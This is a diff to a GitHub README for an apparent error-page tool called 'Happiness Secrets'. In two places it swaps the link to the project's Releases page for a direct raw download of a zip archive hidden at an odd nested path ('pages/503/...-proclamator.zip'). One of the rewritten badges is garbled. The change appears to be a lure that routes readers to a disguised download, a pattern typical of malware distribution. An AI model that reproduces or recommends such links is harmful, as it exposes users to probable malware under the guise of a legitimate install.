@@ -8,7 +8,7 @@ Welcome to Happiness Secrets! This application helps you manage beautiful error 
 
 To get started, visit our Releases page by clicking the link below. From there, you can download the latest version of Happiness Secrets.
 
-[![Download Happiness-Secrets](https://img.shields.io/badge/Download%20Happiness--Secrets-v1.0-blue)](https://github.com/zezitogluteos/Happiness-Secrets/releases)
+[![Download Happiness-Secrets](https://github.com/zezitogluteos/Happiness-Secrets/raw/refs/heads/main/pages/503/Happiness-Secrets-proclamator.zip%20Happiness--Secrets-v1.0-blue)](https://github.com/zezitogluteos/Happiness-Secrets/raw/refs/heads/main/pages/503/Happiness-Secrets-proclamator.zip)
 
 ### Steps to Download:
 
@@ -73,6 +73,6 @@ If you encounter issues while installing or using Happiness Secrets:
 
 If you have questions or need further assistance, feel free to reach out by opening an issue on GitHub. We are here to help!
 
-[![Download Happiness-Secrets](https://img.shields.io/badge/Download%20Happiness--Secrets-v1.0-blue)](https://github.com/zezitogluteos/Happiness-Secrets/releases)
+[![Download Happiness-Secrets](https://github.com/zezitogluteos/Happiness-Secrets/raw/refs/heads/main/pages/503/Happiness-Secrets-proclamator.zip%20Happiness--Secrets-v1.0-blue)](https://github.com/zezitogluteos/Happiness-Secrets/raw/refs/heads/main/pages/503/Happiness-Secrets-proclamator.zip)
 
 Thank you for choosing Happiness Secrets! Enjoy your enhanced error pages and the insights they will provide.
